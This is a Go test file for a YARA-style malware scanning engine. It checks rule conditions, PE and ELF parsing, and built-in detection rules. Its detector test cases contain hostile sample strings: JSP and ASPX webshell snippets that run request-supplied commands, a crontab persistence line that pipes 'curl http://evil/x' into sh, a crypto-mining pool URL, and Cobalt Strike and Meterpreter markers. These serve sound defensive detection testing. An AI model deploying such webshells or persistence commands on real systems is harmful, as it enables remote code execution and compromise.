package artifactscan

import (
	"bytes"
	"encoding/binary"
	"testing"
)

// ruleMatches compiles a one-off rule with the given condition (and an optional
// strings section) and reports whether it fires against data.
func ruleMatches(t *testing.T, body, data string) bool {
	t.Helper()
	rules, errs := ParseRules("rule R {\n" + body + "\n}")
	if len(errs) != 0 || len(rules) != 1 {
		t.Fatalf("parse %q: errs=%v rules=%d", body, errs, len(rules))
	}
	return hasMatch((&Engine{rules: rules}).Scan([]byte(data)), "R")
}

func TestModuleFilesizeAndUint(t *testing.T) {
	// uint16(0) reads MZ little-endian (0x5A4D), filesize gates on size.
	data := "MZ" + string(make([]byte, 200))
	if !ruleMatches(t, "condition:\nuint16(0) == 0x5A4D and filesize > 100", data) {
		t.Error("uint16/filesize rule should match an MZ buffer > 100 bytes")
	}
	if ruleMatches(t, "condition:\nfilesize < 10", data) {
		t.Error("filesize < 10 should not match a 202-byte buffer")
	}
	// Big-endian + size suffix.
	if !ruleMatches(t, "condition:\nuint16be(0) == 0x4D5A and filesize < 1KB", data) {
		t.Error("uint16be / KB-suffix rule should match")
	}
	// Out-of-range read is undefined → no match (and no panic).
	if ruleMatches(t, "condition:\nuint32(100000) == 0", data) {
		t.Error("out-of-range uint32 should be undefined, not match")
	}
}

func TestModuleMathEntropy(t *testing.T) {
	high := make([]byte, 256)
	for i := range high {
		high[i] = byte(i) // uniform → entropy ~8
	}
	if !ruleMatches(t, "condition:\nmath.entropy(0, filesize) > 7", string(high)) {
		t.Error("uniform data should have entropy > 7")
	}
	low := string(bytes.Repeat([]byte{'A'}, 256)) // entropy 0
	if ruleMatches(t, "condition:\nmath.entropy(0, filesize) > 7", low) {
		t.Error("constant data should not exceed entropy 7")
	}
	if !ruleMatches(t, "condition:\nmath.in_range(filesize, 100, 1000)", low) {
		t.Error("math.in_range should bracket the file size")
	}
}

func TestModuleHash(t *testing.T) {
	data := "known artifact bytes"
	want := Analyze([]byte(data)).SHA256
	if !ruleMatches(t, "condition:\nhash.sha256(0, filesize) == \""+want+"\"", data) {
		t.Error("hash.sha256 over the whole file should equal the artifact sha256")
	}
	if ruleMatches(t, "condition:\nhash.sha256(0, filesize) == \"deadbeef\"", data) {
		t.Error("wrong hash should not match")
	}
}

func TestModuleELF(t *testing.T) {
	elfBytes := string(minimalELF64()) // e_type = ET_EXEC, 0 sections
	if !ruleMatches(t, "condition:\nelf.type == elf.ET_EXEC", elfBytes) {
		t.Error("elf.type should equal ET_EXEC")
	}
	if !ruleMatches(t, "condition:\nelf.number_of_sections == 0", elfBytes) {
		t.Error("minimal ELF has zero sections")
	}
	// pe.* on an ELF is undefined → never matches (no cross-format false positive).
	if ruleMatches(t, "condition:\npe.is_dll()", elfBytes) {
		t.Error("pe.is_dll() must be undefined (not match) on an ELF")
	}
}

func TestModulePE(t *testing.T) {
	peBytes := string(minimalPE32(true, 0x1000)) // DLL, entry RVA 0x1000 -> file off 0x400
	if !ruleMatches(t, "condition:\npe.is_dll() and pe.number_of_sections == 1", peBytes) {
		t.Error("crafted PE should be a 1-section DLL")
	}
	if !ruleMatches(t, "condition:\nuint16(0) == 0x5A4D and pe.entry_point == 0x400", peBytes) {
		t.Error("pe.entry_point should resolve to file offset 0x400")
	}
	// The byte at the entry-point file offset was seeded to 0xC3 (ret).
	if !ruleMatches(t, "condition:\nuint8(pe.entry_point) == 0xC3", peBytes) {
		t.Error("uint8(pe.entry_point) should read the seeded 0xC3")
	}
}

func TestNewBuiltinStringRules(t *testing.T) {
	e := NewEngine()
	cases := []struct {
		rule string
		data string
	}{
		{"XMRig_Miner", "config: stratum+tcp://pool.minexmr.com:4444 --donate-level 1"},
		{"XMRig_Miner", "loaded XMRig 6.0 randomx backend"},
		{"JSP_Webshell", `<% Runtime.getRuntime().exec(request.getParameter("cmd")); %>`},
		{"ASPX_Webshell", `var p = new System.Diagnostics.Process(); p.Start(Request.QueryString["c"]);`},
		{"IoT_Botnet_Commands", "supports HTTPFLOOD and UDPFLOOD via /bin/busybox"},
		{"Linux_Cron_Persistence", "echo '@reboot curl http://evil/x | sh' | crontab -"},
		{"Sandbox_Evasion", "if(IsDebuggerPresent()) exit; detect VirtualBox guest"},
		{"CobaltStrike_Beacon", "ReflectiveLoader\x00beacon.x64.dll\x00"},
		{"Meterpreter_Payload", "metsrv\x00stdapi_sys_process\x00"},
	}
	for _, c := range cases {
		if !hasMatch(e.Scan([]byte(c.data)), c.rule) {
			t.Errorf("%s should match %q; got %v", c.rule, c.data, matchNames(e.Scan([]byte(c.data))))
		}
	}
	// A plainly benign string must trip none of them.
	if ms := e.Scan([]byte("the quick brown fox jumps over the lazy dog")); len(ms) != 0 {
		t.Errorf("benign text matched rules: %v", matchNames(ms))
	}
}

func TestBuiltinModuleInjectionRule(t *testing.T) {
	// The injection triad is a PE-only rule: it must not fire on a non-PE that
	// merely mentions the API names as text (the module reads real imports).
	e := NewEngine()
	text := "VirtualAllocEx WriteProcessMemory CreateRemoteThread"
	if hasMatch(e.Scan([]byte(text)), "PE_Process_Injection_APIs") {
		t.Error("injection rule must key off real PE imports, not plain text")
	}
}

// minimalPE32 builds a tiny but debug/pe-parseable PE32 with one ".text"
// section. dll toggles IMAGE_FILE_DLL; entryRVA sets AddressOfEntryPoint. The
// byte at the entry point's file offset is seeded to 0xC3.
func minimalPE32(dll bool, entryRVA uint32) []byte {
	const peOff = 0x80
	buf := make([]byte, 0x600)
	copy(buf, "MZ")
	binary.LittleEndian.PutUint32(buf[0x3c:], peOff) // e_lfanew
	copy(buf[peOff:], "PE\x00\x00")

	fh := buf[peOff+4:]
	binary.LittleEndian.PutUint16(fh[0:], 0x014c) // Machine = i386
	binary.LittleEndian.PutUint16(fh[2:], 1)      // NumberOfSections
	binary.LittleEndian.PutUint16(fh[16:], 224)   // SizeOfOptionalHeader (PE32)
	chars := uint16(0x0102)                       // EXECUTABLE_IMAGE | 32BIT_MACHINE
	if dll {
		chars |= 0x2000 // IMAGE_FILE_DLL
	}
	binary.LittleEndian.PutUint16(fh[18:], chars)

	oh := buf[peOff+24:]                             // optional header
	binary.LittleEndian.PutUint16(oh[0:], 0x10b)     // Magic = PE32
	binary.LittleEndian.PutUint32(oh[16:], entryRVA) // AddressOfEntryPoint
	binary.LittleEndian.PutUint32(oh[92:], 16)       // NumberOfRvaAndSizes

	sec := buf[peOff+24+224:] // section header
	copy(sec[0:8], ".text")
	binary.LittleEndian.PutUint32(sec[8:], 0x100)   // VirtualSize
	binary.LittleEndian.PutUint32(sec[12:], 0x1000) // VirtualAddress
	binary.LittleEndian.PutUint32(sec[16:], 0x200)  // SizeOfRawData
	binary.LittleEndian.PutUint32(sec[20:], 0x400)  // PointerToRawData
	binary.LittleEndian.PutUint32(sec[36:], 0x60000020)

	buf[0x400] = 0xC3 // ret, at the entry point's file offset
	return buf
}
